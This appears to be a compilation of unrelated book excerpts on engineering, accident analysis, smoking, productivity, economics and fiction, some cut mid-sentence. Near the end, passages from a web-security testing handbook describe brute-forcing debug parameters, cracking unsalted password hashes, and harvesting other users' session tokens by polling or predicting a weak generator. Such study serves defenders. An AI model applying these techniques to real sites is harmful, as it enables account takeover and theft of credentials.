free will is deep in us and we are reluctant to give it up for ourselves—but we are often willing to deny it to others! As another example of the tacit belief in the lack of free will in others, consider when there is a high rate of crime in some neighborhood of a city many people believe the way to cure it is to change the environment—hence the people will have to change and the crime rate will go down! These are merely more examples to get you involved with the question of, "Can machines think?" Finally, perhaps thinking should be measured not by what you do but how you do it. When I watch a child learning how to multiply two, say three digit, numbers, then I have the feeling the child is thinking; when I do the same multiplication I feel I am more doing "conditioned responses"; when a computer does the same multiplication I do not feel the machine is thinking at all. In the words of the old song, "It ain't what you do, it's the way that you do it". In the area of thinking maybe we have confused what is done with the way it is done, and this may be the source of much of our confusion in AI.

We now abstract what we have learned.

It is traditional to accept, in the long run, the definition we use actually defines the thing defined; but of course it only tells us how to handle things, and in no way actually tells us any meaning.

If you sample a nonbandlimited function, then the higher frequencies are "aliased" into lower ones, a word devised by Tukey to describe the fact that a single high frequency will appear later as a single low frequency in the Nyquist band. The same is not true for any other set of functions, say powers of t.

He immediately wanted to come up to my office, but I was obdurate and insisted on meeting in his laboratory. He tried using his office, and I stuck to the lab. Why? Because I wanted to size up his abilities and decide if I thought his problem was worth my time and effort, since it promised to be a tough nut to crack.

Kaiser had always thought of a signal as a function of time, and the square of the area under the curve as the energy, but here the energy was the independent variable! I had repeated trouble with Kaiser over this point until I bluntly said, "All right, his energy is time and the measurements, the counts, is the voltage". Only then could Kaiser do it.

When to doubt, when to examine the basics, when to think for yourself, and when to go on and accept things as they are, is a matter of style, and I can give no simple formula on how to decide.

another belief of mine—doing simple simulations at the early stages lets you get insights into the whole system which would be disguised in any full scale simulation.

How soon will fiber optic techniques get down to the chips? After all, the bandwidth of optics means, inferentially, higher pulse rates!

This is not to say Mathematics is perfect—not at all—but nothing better seems to be available. You have only to look at the legal system and the income tax people, and their use of the natural language to express what they mean, to see how inadequate the English language is for clear thinking. This simple statement, "I am lying." contradicts itself!

There are, I am told, some 467 theorems in Euclid, but not one of these theorems turned out to be false after Hilbert's added his postulates! Yet, every theorem which needed one of these new postulates could not have been rigorously "proved" by Euclid! Every theorem which followed, and rested on such a theorem, was also not "proved" by Euclid. Yet the results in the improved system were still the same as those Euclid regarded as being true. How could this be? How could it be Euclid, though he had not actually proved the bulk of his theorems, never made a mistake? Luck? Hardly!

It soon became evident to me one of the reasons no theorem was false was that Hilbert "knew" the Euclidean theorems were "correct", and he had picked his added postulates so this would be true. But then I soon realized Euclid had been in the same position; Euclid knew the "truth" of the Pythagorean theorem, and many other theorems, and had to find a system of postulates which would let him get the results he knew in advance. Euclid did not lay down postulates and make deductions as it is commonly taught; he felt his way back from "known" results to the postulates he needed!

There is a group of people in software who believes we should "prove programs are correct" much as we prove theorems in Mathematics are correct. The two fallacies they commit are: (1) we do not actually "prove" theorems! (2) many important programming problems cannot be defined sharply enough so a proof can be given, rather the program which emerges defines the problem! This does not mean there is nothing of value to their approach of proving programs are correct, only, as so often happens, their claims are much inflated.

Von Neumann in his classic work on QM proved there were no hidden variables, meaning there was no lower structure and Nature was essentially probabilistic—a point Einstein never would accept. But the proof was found to be fallacious, new proofs found, and in their turn found to be fallacious—the current situation being a toss up as to what you want to believe.

The Aspect experiments apparently force you to accept non-local effects—what happens at one place is affected by remote things and the effect which is transmitted does not, in any real sense, pass through the local areas in between but gets there immediately. But apparently you cannot use the effect for useful signaling.

It is important to notice, while I have indicated maybe we can never understand QM in the classical sense of "understand", we have never-the-less created a formal Mathematical structure which we can use very effectively. Thus, as we go into the future and perhaps meet many more things we cannot "understand", still we may be able to create formal Mathematical structures which will enable us to cope with the fields. Unsatisfactory? Yes! But it is amazing how you get used to QM after you work with it long enough.

The Art world, especially painting, has had a great deal of trouble with the distinction between creativity and originality for most of this century. Modern artists, and Museum Directors, offer to the public things which are certainly novel and new, but which many of the potential paying public often does not like. For many people the shock value of various forms of art has finally worn off, and the average person no longer responds to the current "modern art".

We also have the fact many of the current highly valued works of Art were not appreciated during the artist's lifetime—indeed the phenomenon is so common as to be discouraging.

I once applied the well known method of least squares to a problem in magnetics. The other person wrote it up, with me as joint author, and sent it to me for my signature (for release for publication). I went to a shrewd physicist friend and said I could not publish a paper which merely applied least squares. He observed to me his most requested reprint was for a paper in solid state physics which applied standard circuit analysis to the problem; and since the paper awaiting my signature was new in the area I should sign and let it be published.

I have no real suggestions (I can put into concrete words) on how to make you, magically, more creative in your careers. The topic is too important to ignore, even if I do not understand the creative act very well.

This is followed by a longer or shorter period of refinement of the problem. Do not be too hasty at this stage, as you are likely to put the problem in the conventional form and find only the conventional solution. This stage, more over, requires your emotional involvement, your commitment to finding a solution since without a deep emotional involvement you are not likely to find a really fundamental, novel solution.

A long gestation period of intense thinking about the problem may result in a solution, or else the temporary abandonment of the problem. This temporary abandonment is a common feature of many great creative acts. The monomaniacal pursuit often does not work; the temporary dropping of the idea sometimes seems to be essential to let the subconscious find a new approach.

Then comes the moment of "insight", creativity, or what ever you want to call it—you see the solution. Of course it often happens that you are wrong; a closer examination of the problem shows the solution is faulty, but might be saved by some suitable revision. But maybe the problem needs to be altered to fit the solution! That has happened! More usually it is back to the drawing board, as they say, more mulling things over.

When stuck I often ask myself, "If I had a solution, what would it look like?" This tends to sharpen up the approach, and may reveal new ways of looking at the problem you had subconsciously ignored but you now see should not be excluded. What must the solution involve? Are there conservation laws which must apply? Is there some symmetry? How does each assumption enter into the solution, and is each one really necessary? Have you recognized all the relevant factors?

If the solution does come from the subconscious, what can we do to manage our subconscious? My method, and it is implied above, is to saturate the subconscious with the problem, try to not think seriously about anything else for hours, days, or even weeks, and thus the subconscious which, so far as we know, depends heavily upon live experiences to form its dreams, etc. is then left with only the problem to mull over.

Wide acquaintance with various fields of knowledge is thus a help—provided you have the knowledge filed away so it is available when needed, rather than to be found only when led directly to it. This flexible access to pieces of knowledge seems to come from looking at knowledge while you are acquiring it from many different angles, turning over any new idea to see its many sides before filing it away. This implies effort on your part not to take the easy, immediately useful "memorizing the material" path, but prepare your mind for the future.

Over the years of watching and working with John Tukey I found many times he recalled the relevant information and I did not, until he pointed it out to me. Clearly his information retrieval system had many more "hooks" than mine did. At least more useful ones! How could this be? Probably because he was more in the habit than I was of turning over new information again and again so his "hooks" for retrieval were more numerous and significantly better than mine were.

Without self-confidence you are not likely to create great, new things. There is a thin line between having enough self-confidence and being over-confident.

In some respects the expert is the curse of our society with their assurance they know everything, and without the decent humility to consider they might be wrong. Where the question looms so important I suggested to you long ago to use in an argument, "What would you accept as evidence you are wrong?" Ask yourself regularly, "Why do I believe whatever I do". Especially in the areas where you are so sure you know; the area of the paradigms of your field.

I had long ago argued at Bell Telephone Laboratories we should form a life testing department whose job is to prepare for the testing of the next device which is going to be invented, and not just test after the need arises. I got nowhere, though I made a few, fairly weak, suggestions about how to start. There was not time in the area of life testing to do basic research—they were under too much pressure to get the needed results tomorrow.

a friend of mine at Bell Telephone Laboratories, who was a very good statistician, felt some data he was analyzing was not accurate. Arguments with the department head they should be measured again got exactly nowhere since the department head was sure his people were reliable and furthermore the instruments had brass labels on them saying they were that accurate. Well, my friend came in one Monday morning and said he had left his brief case on the railroad train going home the previous Friday and had lost everything. There was nothing else the department head could do but call for remeasurements, whereupon my friend produced the original records and showed how far off they were! It did not make him popular, but did expose the inaccuracy of the measurements which were going to play a vital role at a later stage.

There have been complaints that I would take too long, but almost always I found errors and when I showed the errors to them they had to admit I was wise in taking the precautions I did.

There is a clever proposed method whose effectiveness I do not know in practice. Suppose you want to measure the amount of murder which escapes detection. You interview people and tell them to toss a coin without anyone but themselves seeing the outcome, and then if it is heads they should claim they have committed a murder, while if tails they should tell the truth. In the arrangement there is no way anyone except themselves can know the outcome of the toss, hence no way they can be accused of murder if they say so. From a large sample the slight excess of murders above one half gives the measure you want. But that supposes the people asked, and given protection, will in fact respond accurately. Variations on this method have been discussed widely, but a serious study to find the effectiveness is still missing, so far as I know.

During my last two undergraduate college years when I was the University of Chicago, the rule was at the end you had to pass a single exam based on 9 courses in your major field, and another exam based on 6 in your minor field, and these were mainly what mattered, not what grades you got along the way. I, for the first time, came to understand what the system approach to education means. While taking any one course, it was not a matter of passing it, pleasing the professor, or anything like that, it was learning it so at a later date, maybe two years later, I would still know the things which should be in the course.

The question, as in so many situations, "What is the total problem in which this part is to fit?" is simply regarded as too big, and hence the sub-optimization of the courses goes on. Few people who set out to reform any system try first to find out the total system problem, but rather attack the first symptom they see. And, of course, what emerges is what ever it is, and is not what is needed.

I suspect it was the telephone company which first had to really face the problems of systems engineering. If decent service was to be supplied then all the parts had to interconnect, and work at a very high reliability per part. From the first the company provided a service, not just equipment. That is a big difference.

while running the computing center in the early days I came to the belief small problems were relatively more important than large ones; regulardependable service was a desirable thing. So I instituted a 1 hour period in each morning and each afternoon during which only 3 minute (or less) problems were to be run (mainly program testing) and if you ran over 5 minutes you got off the machines no matter how much you had claimed you were practically finished. Well, people with 10 minute problems broke them up into three small pieces with different people for each piece and ran them under the rules-thus increasing the load in the input/output facilities. My solution's very presence alters the system's response. The optimal strategy for the individual was clearly opposed to the optimal strategy for the whole of the laboratories, and it is one of the functions of the systems engineer to block most of the local optimization of the individuals of the system and reach for the global optimization for the system.

Capitalism (he’d argued) created misery, but it also created progress, and the revolution that was going to liberate mankind from misery would only happen once capitalism had contributed all the progress that it could, and all the misery too. At that point, there would be so much money invested by capitalists desperate to keep their profits up, that the infrastructure for producing things would have attained a state of near-perfection. At the same time, the search for higher profits would have driven the wages of the working class down to the point of near-destitution. It would be a world of wonderful machines and ragged humans. When the contradiction became unbearable, the workers would act. They would abolish a social system that was absurdly more savage and unsophisticated than the production lines in the factories.

The Bolsheviks had no chance of influencing events, and certainly no chance at getting anywhere near political power, until the First World War turned Russian society upside down. In the chaos and economic collapse following the overthrow of the Tsar by disorganised liberals, they were able to use the discipline of the cult’s membership to mount a coup d'état – and then to finesse themselves into the leadership of all those in Russia who were resisting the armed return of the old regime. Suddenly, a small collection of fanatics and opportunists found themselves running the country that least resembled Marx’s description of a place ready for socialist revolution.

The sovnarkhoz, needless to say, knew what you were doing, knew the first estimate was always going to be deceptive. The trick was to make the deception seem transparent, thus gently flattering them in their sense that they knew what was really going on. It should seem to be offering them a hint about where you thought the true figure ought to lie.

I will also be asking you to trust me, and to make just a little bit of your output available, now and again, when I ask you to ship it somewhere. Because friends look after friends; and when you’re with me, you aren’t just friends with the people you do business with direct, you’re friends with everyone I’m friends with. And that’s enough people, I promise you, to solve virtually any problem you may have. So tell me, while we get another bottle of this good sweet wine here – what are you worrying about, just now?

If I understand correctly, they’re calculated from the efficiency of the enterprises’ equipment. In other words, they depend on managers submitting completely truthful information about what their enterprises are capable of. Speaking as somebody who has been trying to get them to do just that for nearly thirty years, I have to say it strikes me as a trifle unlikely that they’ll change their ways just because you’ve sent them a new form to fill in.

At the beginning, the focus in industrial accident prevention was on unsafe conditions, such as open blades and unprotected belts. While this emphasis on preventing unsafe conditions was very successful in reducing workplace injuries, the decrease naturally started to slow down as the most obvious hazards were eliminated. The emphasis then shifted to unsafe acts: Accidents began to be regarded as someone's fault rather than as an event that could have been prevented by some change in the plant or product.

One of the factors involved in the accident was the design of the flight control computer software. Previous incidents with the same type of aircraft had led to a Service Bulletin being issued for a modification of the two flight control computers to fix the problem. But because the computer problem had not been labeled a "cause" of the previous incidents (for perhaps at least partially political reasons), the modification was labeled recommended rather than mandatory. China Airlines concluded, as a result, that the implementation of the changes to the computers was not urgent and decided to delay modification until the next time the flight computers on the plane needed repair [4]. Because of that delay, 264 passengers and crew died.

It is not uncommon for a company to turn off passive safety devices, such as refrigeration units, to save money. The operating manual specified that the refrigeration unit must be operating whenever MIC was in the system: The chemical has to be maintained at a temperature no higher than 5° Celsius to avoid uncontrolled reactions. A high temperature alarm was to sound if the MIC reached 11°. The refrigeration unit was turned off, however, to save money, and the MIC was usually stored at nearly 20°. The plant management adjusted the threshold of the alarm, accordingly, from 11° to 20° and logging of tank temperatures was halted, thus eliminating the possibility of an early warning of rising temperatures.

The importance of this decomposition strategy is not simply that one is dividing the program into parts. After all, we could take any large program and divide it into parts—the first ten lines, the next ten lines, the next ten lines, and so on. Rather, it is crucial that each procedure accomplishes an identifiable task that can be used as a module in defining other procedures.

Most smokers who think about it eventually come to the conclusion that it is just a habit. This is not really an explanation but, having discounted all the usual rational explanations, it appears to be the only remaining excuse. Unfortunately, this explanation is equally illogical. Every day of our lives we change habits, and some of them are very enjoyable. We have been brainwashed to believe that smoking is a habit and that habits are difficult to break. Are habits difficult to break? In the UK we are in the habit of driving on the left side of the road. Yet when we drive on the Continent or in the United States, we immediately break that habit with hardly any aggravation whatsoever.

The moment you stop smoking, everything that goes wrong in your life is blamed on the fact that you’ve stopped smoking. Now when you have a mental block, instead of just getting on with it you start to say, ‘If only I could light up now, it would solve my problem.’ You then start to question your decision to quit smoking.

In the Bhopal accident, the vent scrubber, flare tower, water spouts, refrigeration unit, and various monitoring instruments were all out of operation simultaneously. Assigning probabilities to all these seemingly unrelated events and assuming independence would lead one to believe that this accident was merely a matter of a once-in-a-lifetime coincidence. A probabilistic risk assessment based on an event chain model most likely would have treated these conditions as independent failures and then calculated their coincidence as being so remote as to be beyond consideration. Reason, in his popular Swiss Cheese Model of accident causation based on defense in depth, does the same, arguing that in general "the chances of such a trajectory of opportunity finding loopholes in all the defences at any one time is very small indeed" [172, p. 208]. As suggested earlier, a closer look at Bhopal and, indeed, most accidents paints a quite different picture and shows these were not random failure events but were related to engineering and management decisions stemming from common systemic factors.

While such distribution of responsibility may be important in determining how much each company will have to pay, it is arbitrary and does not provide any important information with respect to accident prevention in the future. The verdict is interesting, however, because the jury rejected the oversimplified notion of causality being argued.

Sam has tried smoking, although not one of Eugene’s cigars. It was at a party, and it took an older woman to weaken his resolve. Sam was eleven. The seductress was a twelve-year-old girl from Saskatchewan. Sam left the party early, feeling sick. He quit smoking the next morning. “It’s not as hard as they say,” he told his friend Murphy. “Whenever I feel like a cigarette, I eat candy.”

Sam has a doctor’s appointment.” Sam was nervous because he didn’t know about the doctor. He thought maybe he was so sick that his parents hadn’t wanted to tell him. But instead of driving to the doctor, his dad winked and headed downtown. He was taking Sam to his first-ever ball game.

This book is best described as an attempt to formalize and explain my attraction to depth over shallowness, and to detail the types of strategies that have helped me act on this attraction. I’ve committed this thinking to words, in part, to help you follow my lead in rebuilding your life around deep work—but this isn’t the whole story. My other interest in distilling and clarifying these thoughts is to further develop my own practice. My recognition of the deep work hypothesis has helped me thrive, but I’m convinced that I haven’t yet reached my full value-producing potential. As you struggle and ultimately triumph with the ideas and rules in the chapters ahead, you can be assured that I’m following suit—ruthlessly culling the shallow and painstakingly cultivating the intensity of my depth.

distraction remains a destroyer of depth. Therefore, the hub-and-spoke model provides a crucial template.

Shutdown rituals can become annoying, as they add an extra ten to fifteen minutes to the end of your workday (and sometimes even more), but they’re necessary for reaping the rewards of systematic idleness summarized previously. From my experience, it should take a week or two before the shutdown habit sticks—that is, until your mind trusts your ritual enough to actually begin to release work-related thoughts in the evening. But once it does stick, the ritual will become a permanent fixture in your life—to the point that skipping the routine will fill you with a sense of unease.

The idea motivating this strategy is that the use of a distracting service does not, by itself, reduce your brain’s ability to focus. It’s instead the constant switching from low-stimuli/high-value activities to high-stimuli/low-value activities, at the slightest hint of boredom or cognitive challenge, that teaches your mind to never tolerate an absence of novelty.

If possible, commit publicly to the deadline—for example, by telling the person expecting the finished project when they should expect it.

“Thinking deeply” about a problem seems like a self-evident activity, but in reality it’s not. When faced with a distraction-free mental landscape, a hard problem, and time to think, the next steps can become surprisingly non-obvious.

That’s why it was left to wizards, who knew how to handle it safely. Not doing any magic at all was the chief task of wizards—not “not doing magic” because they couldn’t do magic, but not doing magic when they could do and didn’t. Any ignorant fool can fail to turn someone else into a frog. You have to be clever to refrain from doing it when you knew how easy it was.

Dagny’s rise among the men who operated Taggart Transcontinental was swift and uncontested. She took positions of responsibility because there was no one else to take them. There were a few rare men of talent around her, but they were becoming rarer every year. Her superiors, who held the authority, seemed afraid to exercise it, they spent their time avoiding decisions, so she told people what to do and they did it. At every step of her rise, she did the work long before she was granted the title. It was like advancing through empty rooms. Nobody opposed her, yet nobody approved of her progress.

find no answer. It was only in the first few years that she felt herself screaming silently, at times, for a glimpse of human ability, a single glimpse of clean, hard, radiant competence. She had fits of tortured longing for a friend or an enemy with a mind better than her own. But the longing passed. She had a job to do. She did not have time to feel pain; not often. The first step of the policy that James Taggart brought to the railroad was the construction of the San Sebastián Line. Many men were responsible for it; but to Dagny, one name stood written across the venture, a name that wiped out all others whenever she saw it. It stood across five years of struggle, across miles of wasted track, across sheets of figures that recorded the losses of Taggart Transcontinental like a red trickle from a wound which would not heal—as it stood on the ticker tape of every stock exchange left in the world—as it stood on smokestacks in the red glare of furnaces melting copper—as it stood in scandalous headlines—as it stood on parchment pages recording the nobility of the centuries—as it stood on cards attached to flowers in the boudoirs of women scattered through three continents. The name was Francisco d’Anconia. At the age of twenty-three, when he inherited his fortune, Francisco d’Anconia had been famous as the copper king of the world. Now, at thirty-six, he was famous as the richest man and the most spectacularly worthless playboy on earth. He was the last descendant of one of the noblest families of Argentina. He owned cattle ranches, coffee plantations and most of the copper mines of Chile. He

I had no personal interest in it whatever. Isn’t it evil to work for profit? I did not work for profit—I took a loss. Doesn’t everyone agree that the purpose and justification of an industrial enterprise are not production, but the livelihood of its employees? The San Sebastián Mines were the most eminently successful venture in industrial history: they produced no copper, but they provided a livelihood for thousands of men who could not have achieved in a lifetime, the equivalent of what they got for one day’s work, which they could not do. Isn’t it generally agreed that an owner is a parasite and an exploiter, that it is the employees who do all the work and make the product possible? I did not exploit anyone. I did not burden the San Sebastián Mines with my useless presence; I left them in the hands of the men who count. I did not pass judgment on the value of that property. I turned it over to a mining specialist. He was not a very good specialist, but he needed the job very badly. Isn’t it generally conceded that when you hire a man for a job, it is his need that counts, not his ability? Doesn’t everyone believe that in order to get the goods, all you have to do is need them?

It sometimes seemed to Herman that Van leaned on people because he wanted them to give him an excuse to shoot them, but most of the time he realised that Van was playing a deeper game than that. He leaned hard so people would think he was trying to goad them, so they would think he was a bad-ass killer just barely in control of himself, and the result was that they were always just as nice as pie.

Derrida based his attack in contexts that were particularly useful for thinking about gender and queerness: language, reason, and meaning. Gender is a language, a system of meanings and symbols, along with the rules, privileges, and punishments pertaining to their use—for power and sexuality (masculinity and femininity, strength and vulnerability, action and passivity, dominance and weakness). Since it is a system of meanings, gender can be applied to almost anything

We know the meaning of chair by learning what is not chair. In other words, we exclude all the other close matches that that aren’t quite chairs: stools, chaise lounges, love seats, and so on. We create the template for chair by a process of exclusion. This means that from its inception, the meaning of chair depends on all those excluded things that are not-chair. With gender, we create the meaning of woman by excluding everything that is non-Woman, and vice versa for Man. We form idealized templates for what is perfectly masculine or perfectly feminine by excluding whatever doesn’t fit: the queer, the different, the mixed—people like me.

Trying to be inclusive won’t help when it comes to binaries. For instance, take the ever-popular “spectrum of gender.” It’s an effort to be more inclusive when it comes to gender. But it’s inevitably anchored by the only two real genders—Man and Woman.

We equate truth with unity. In fact, our attempts at truth are usually attempts to find and restore an underlying unity of things. Perhaps this stems from our Judeo-Christian tradition, in which the one, true God of the Hebrews is good and virtuous, and the faithful slaughter their enemies who believe in many gods—who are therefore false, duplicitous, and evil. In any case, we discount difference as a noise in the system, a problem to be resolved, a veil hiding the real unity of things.

A master in the art of living draws no sharp distinction between his work and his play; his labor and his leisure; his mind and his body; his education and his recreation. He hardly knows which is which. He simply pursues his vision of excellence through whatever he is doing, and leaves others to determine whether he is working or playing. To himself, he always appears to be doing both. — Vicomte Francois René de Chateaubriand

If taxes are to be levied … on … the value of … properties … it is important that assessment procedures be adopted which estimate the true economic value…. The economist’s answer … is simple and essentially fool-proof: allow each … owner … to declare the value of his own property, make the declared values … public, and require that an owner sell his property to any bidder … willing to pay … the declared value. This system is simple, self-enforcing, allows no scope for corruption, has negligible cost of administration, and creates incentives, in addition to those already present in the market, for each property to be put to that use in which it has the highest economic productivity.

Harberger’s tax, later also proposed by the Nobel Prize–winning economist Maurice Allais, makes it costly to declare a high valuation and thus deter the purchase of assets. Therefore, it penalizes any attempt to exercise monopoly power over an asset.42 The higher the price the possessor demands, the more tax she must pay.

Because of this quadratic structure, it is always optimal to have at least a very small tax. For example, a 1% tax will hardly distort investment at all but can still significantly improve allocative incentives. The owner will self-assess with reasonable accuracy to minimize her tax bill, but she will not be deterred from making valuable investments in the property. It is typically optimal to set a moderate tax rate, below turnover rate, that balances these two forces.

A COST would be useful for handling many other public assets. For example, ranchers lease grazing rights from the government, which often doesn’t know how to price those rights. A COST, in which ranchers would effectively “buy” grazing rights from one another at self-assessed prices, would work more smoothly. A COST could also be used for leases on mineral, fishery, farming, and other natural resource leases, which are frequently sold off at arbitrary prices.

The most persistent distributive conflict in capitalist economies arises from the concentration of wealth. Because most of the returns to capital flow to the very wealthy, a broad distinction exists between those who live primarily off the returns to capital and those who live off their labor. A COST would make most of the return to capital flow to the public, making it more equally distributed than wages.

Recall that the problem with a standard pricing model of public goods, where influence is based on a one-to-one relationship with how much you pay, is that those who care most about an issue want to buy all the votes, while those who care only a little buy none. The problem is that votes are too cheap for those who care a lot, but too expensive for those who care little. The way to solve this is to make the next vote more expensive to those who have already bought many votes than it is to those buying their first vote.

If a respondent truly cares about only one issue (which is very unlikely), she will spend her entire budget to buy relatively few votes to take a position on one issue. If she cares about many issues, she must decide how to allocate her votes across them. She may discover, for example, that while she cares a lot about abortion rights, she doesn’t want to use up so many credits to vote in favor of them that she can’t even buy one vote in order to take a position on the Affordable Health Care Act of 2010 or the minimum wage.

most people living in wealthy cities who consider themselves sympathetic to the plight of migrants know little or nothing of the language, cultures, aspirations, and values of those they claim to sympathize with. They benefit greatly from the cheap services these migrants offer and rarely concern themselves with the poverty in which they live. The solidarity of such cosmopolitan elites is thus skin deep. But it is better than the open hostility many ordinary citizens of wealthy countries feel toward migrants.

Perhaps it is a coincidence, but over precisely the same period that institutional investors rose to prominence, the dominant corporate “ideology” shifted away from one emphasizing investment and innovation and toward one favoring retrenchment, lobbying, and cost-cutting.30 Such initiatives may result in lower competition and thus higher profits for institutional investors.

A simple but radical reform can prevent this dystopia: ban institutional investors from diversifying their holdings within industries while allowing them to diversify across industries. BlackRock would own as much as it wants of (say) United Airlines, but it would own no stake in Delta, Southwest, and the others.

Once people awaken to their role as data laborers—obtain a “class consciousness,” if you will—organizations (sort of like unions) may emerge to supply data laborers with the means to engage in collective action. Imagine, for example, a data labor union that solicited members—the data laborers—by promising them higher payments for their data. Once the union obtained a critical mass, it could approach Facebook or Google and threaten a “strike” (also, effectively, a boycott because data laborers are simultaneously consumers of Facebook’s and Google’s services). The technical details would be complex, but we can imagine a range of possible approaches.

It would be a mistake, however, to think that the current system is not coercive. In our current system, there is a wide gulf between educated elites whose native or acquired talents are highly marketable and those who have been left behind by changes sweeping the economy. The talented enjoy a kind of freedom, as they can select from among a variety of appealing jobs. These jobs allow them to quickly accumulate capital that they can depend on as they age, if they do not like the jobs that are available, or pick and choose among different levels of labor (part-time, enjoyable or rewarding but low-paying jobs in the nonprofit sector, etc.). Those with fewer marketable skills are given a stark choice: undergo harsh labor conditions for low pay, starve, or submit to the many indignities of life on welfare. Yet the waste of social resources when a talented person fails to realize her potential is far greater, and arguably their failure to work should be punished more harshly.

This raises the possibility that QV voice credits could be a common currency that countries use to trade influence across different legal regimes—trade, investment, migration, the environment, and so on. Imagine, for example, that countries are given credits in proportion to some combination of their wealth, population, and military power. That means, of course, that large, wealthy, powerful countries would exert more influence over international relations than other countries do, but that’s just the way things are—currently and in the foreseeable future—and we need to ground our proposal in a realistic assessment as to the way things are. QV would not directly eliminate these power asymmetries (though our other proposals might help mitigate them), but it would make it easier for countries to cooperate across issue areas where cooperative gains are possible.

There’s a difference between a client and a workman, and the difference holds true everywhere, not merely in the Unemployment Insurance Division of the Department of Labor of the State of New York. The difference is, the client is there because he wants something, but the workman doesn’t give a damn what happens. The workman won’t extend himself, won’t try to help, won’t provide explanations, won’t in fact do anything but just stand there. The client wants to be liked, but the workman is just as willing to go back to his boss, shrug, and say, “They wouldn’t let me in.”

The point of this practice is to drill into your brain and muscle memory what each chord sounds like to your ears and feels like in your hands and to associate those sounds and feelings with each chord’s symbol/name. Your objective is to be able to see the symbol and play the chord without having to think about it. Those symbols are what you see on lead sheets, in fake books, and on big band charts. You must be able to play the correct chords in real time as the rest of the ensemble plays the tune.

Because human lives are composed in precisely such a fashion. They are composed like music. Guided by his sense of beauty, an individual transforms a fortuitous occurrence (Beethoven's music, death under a train) into a motif, which then assumes a permanent place in the composition of the individual's life. Anna could have chosen another way to take her life. But the motif of death and the railway station, unforgettably bound to the birth of love, enticed her in her hour of despair with its dark beauty. Without realizing it, the individual composes his life according to the laws of beauty even in times of greatest distress.

When he got out of a car and slammed the door, he didn’t do it like just anybody, he did it like an FBI man: step, swing, slam, a fluid motion, flex of muscle, solid and determined, graceful in a manly sort of way. Malcolm Zachary got out of cars like an FBI man, drank coffee like an FBI man, sat quietly listening like an FBI man.

Sometimes, this file contains references to sensitive functionality, which you are certainly interested in spidering. Some spidering tools designed for attacking web applications check for the robots.txt file and use all URLs within it as seeds in the spidering process.

This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material.

Using lists of common debug parameter names (debug, test, hide, source, etc.) and common values (true, yes, on, 1, etc.), make a large number of requests to a known application page or function, iterating through all permutations of name and value. For POST requests, insert the added parameter to both the URL query string and the message body. Burp Intruder can be used to perform this test using multiple payload sets and the “cluster bomb” attack type (see Chapter 14 for more details).

The parts of the URL that precede the query string are often overlooked as entry points, since they are assumed to be simply the names of directories and files on the server file system. However, in applications that use REST-style URLs, the parts of the URL that precede the query string can in fact function as data parameters and are just as important as entry points for user input as the query string itself.

By spoofing the User-Agent header for a popular mobile device, you may be able to access a simplified user interface that behaves differently than the primary interface. Since this interface is generated via different code paths within the server-side application, and may have been subjected to less security testing, you may identify bugs such as cross-site scripting that do not exist in the primary application interface.

If any kind of arbitrary command or query execution vulnerability is identified within the application, attempt to find the location within the application's database or filesystem where user credentials are stored: a. Query these to determine whether passwords are being stored in unencrypted form. b. If passwords are stored in hashed form, check for nonunique values, indicating that an account has a common or default password assigned, and that the hashes are not being salted. c. If the password is hashed with a standard algorithm in unsalted form, query online hash databases to determine the corresponding cleartext password value.

The application should be aggressive in defending itself against unexpected events occurring during login processing. For example, depending on the development language in use, the application should use catch-all exception handlers around all API calls. These should explicitly delete all session and method-local data being used to control the state of the login processing and should explicitly invalidate the current session, thereby causing a forced logout by the server even if authentication is somehow bypassed.

To prevent information leakage about which stage of the login failed (which would enable an attacker to target each stage in turn), the application should always proceed through all stages of the login, even if the user failed to complete earlier stages correctly, and even if the original username was invalid. After proceeding through all the stages, the application should present a generic “login failed” message at the conclusion of the final stage, without providing any information about where the failure occurred.

The application can use e-mail addresses as usernames. Here, the first stage of the registration process requires the user to enter her e-mail address, whereupon she is told simply to wait for an e-mail and follow the instructions contained within it. If the e-mail address is already registered, the user can be informed of this in the e-mail. If the address is not already registered, the user can be provided with a unique, unguessable URL to visit to continue the registration process. This prevents the attacker from enumerating valid usernames (unless he happens to have already compromised a large number of e-mail accounts).

Some applications that have implemented a suspension policy remain vulnerable to brute-forcing because they continue to fully process login attempts during the suspension period, and they return a subtly (or not so subtly) different message when valid credentials are submitted. This behavior enables an effective brute-force attack to proceed at full speed regardless of the suspension policy.

For example, after a successful login, the application should inform users of the time and source IP/domain of the last login and the number of invalid login attempts made since then. If a user is made aware that her account is being subjected to a password-guessing attack, she is more likely to change her password frequently and set it to a strong value.

Given our analysis of how tokens are created, it is straightforward to construct a scripted attack to harvest the session tokens that the application issues to other users: We continue polling the server to obtain new session tokens in quick succession. We monitor the increments in the first number. When this increases by more than 1, we know that a token has been issued to another user. When a token has been issued to another user, we know the upper and lower bounds of the second number that was issued to that person, because we possess the tokens that were issued immediately before and after his. Because we are obtaining new session tokens frequently, the range between these bounds will typically consist of only a few hundred values.

This algorithm takes the last number generated, multiplies it by a constant, and adds another constant to obtain the next number. The number is truncated to 48 bits, and the algorithm shifts the result to return the specific number of bits requested by the caller. Knowing this algorithm and a single number generated by it, we can easily derive the sequence of numbers that the algorithm will generate next. With a little number theory, we also can derive the sequence that it generated previously. This means that an attacker who obtains a single session token from the server can obtain the tokens of all current and future sessions.

The high-level steps in this process are as follows: 1. Start with the hypothesis that the tokens are randomly generated. 2. Apply a series of tests, each of which observes specific properties of the sample that are likely to have certain characteristics if the tokens are randomly generated. 3. For each test, calculate the probability of the observed characteristics occurring, working on the assumption that the hypothesis is true. 4. If this probability falls below a certain level (the “significance level”), reject the hypothesis and conclude that the tokens are not randomly generated.

Some applications elect to use HTTPS to protect the user's credentials during login but then revert to HTTP for the remainder of the user's session. Many web mail applications behave in this way.

Some applications use HTTP for preauthenticated areas of the site, such as the site's front page, but switch to HTTPS from the login page onward. However, in many cases the user is issued a session token at the first page visited, and this token is not modified when the user logs in. The user's session, which is originally unauthenticated, is upgraded to an authenticated session after login. In this situation an eavesdropper can intercept a user's token before login, wait for the user's communications to switch to HTTPS, indicating that the user is logging in, and then attempt to access a protected page (such as My Account) using that token.

In the autumn of 1940, the British desperately needed more warships. The Americans had fifty to spare and so, with what was called the Destroyers for Bases Agreement, the British swapped their ability to be a global power for help in remaining in the war. Almost every British naval base in the Western Hemisphere was handed over.

Europe’s major rivers do not meet (unless you count the Sava, which drains into the Danube in Belgrade). This partly explains why there are so many countries in what is a relatively small space. Because they do not connect, most of the rivers act, at some point, as boundaries, and each is a sphere of economic influence in its own right; this gave rise to at least one major urban development on the banks of each river, some of which in turn became capital cities.

